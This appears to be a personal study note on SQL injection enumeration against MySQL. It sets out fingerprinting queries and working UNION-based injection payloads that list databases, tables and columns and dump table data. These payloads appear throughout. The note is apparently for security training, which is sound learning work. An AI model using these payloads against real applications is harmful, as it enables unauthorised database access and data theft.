# Database enumeration
Identify which database we are using (MySQL, MSSQL,..)

MySQL:

| Payload            | When to Use                      | Expected Output                                     | Wrong Output                                              |
| ------------------ | -------------------------------- | --------------------------------------------------- | --------------------------------------------------------- |
| `SELECT @@version` | When we have full query output   | MySQL Version 'i.e. `10.3.22-MariaDB-1ubuntu1`'     | In MSSQL it returns MSSQL version. Error with other DBMS. |
| `SELECT POW(1,1)`  | When we only have numeric output | `1`                                                 | Error with other DBMS                                     |
| `SELECT SLEEP(5)`  | Blind/No Output                  | Delays page response for 5 seconds and returns `0`. | Will not delay response with other DBMS                   |

# Enumeration

|                                                                                                                              |                                            |
| ---------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------ |
| **DB Enumeration**                                                                                                           |                                            |
| `SELECT @@version`                                                                                                           | Fingerprint MySQL with query output        |
| `SELECT SLEEP(5)`                                                                                                            | Fingerprint MySQL with no output           |
| `cn' UNION select 1,database(),2,3-- -`                                                                                      | Current database name                      |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`                                                    | List all databases                         |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<database_name>'-- -`       | List all tables in a specific database     |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table_name>'-- -` | List all columns in a specific table       |
| `cn' UNION select 1, <column1_name>, <column2_name>, 4 from <database_name>.<table_name>-- -                                 | Dump data from a table in another database |
Remember, it's
- **`select column from database.table**

# INFORMATION_SCHEMA DATABASE
- `SCHEMATA` table contains info on databases of server
	- `SCHEMA_NAME` column shows all database names
	- `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
		- See [[3. SQLi]] for details on Union select injection.
			- Need to make sure number of columns is correct. May not be 4
- Identify the database we are in with `select database()`
	- `cn' UNION select 1,database(),2,3-- -`
- From the databases found in step 1. List the tables in there
	- `INFORMAION_SCHEMA.TABLES` should contain this. Check for correct database name
	- `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<db name>'-- -`
- From the listed tables, choose one and list columns from there.
	- `INFORMATION_SCHEMA.COLUMNS` should contain this. Check for correct table name
	- `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<table_name>'-- -`
- Then finally we can form our union query
	- `cn' UNION select 1, <column1_name>, <column2_name>, 4 from <database_name>.<table_name>-- -
		- Also remember that conditionals exist. `...  where username = 'hello'-- -` etc.
`